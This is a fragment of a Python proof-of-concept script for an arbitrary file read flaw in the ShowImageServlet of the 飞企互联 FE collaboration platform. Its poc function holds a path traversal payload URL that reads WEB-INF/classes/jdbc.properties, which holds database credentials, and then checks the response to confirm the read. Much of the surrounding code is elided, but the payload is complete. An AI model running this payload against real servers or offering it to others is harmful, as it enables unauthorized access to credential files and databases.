...
def main():
    banner()
    parser = argparse.ArgumentParser(description="飞企互联FE业务协作平台ShowImageServlet任意文件读取漏洞")
...
def poc(target):
    payload_url = '/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print'
    ...
    try:
        ...
        if 'database' in res or 'jdbc' in res:
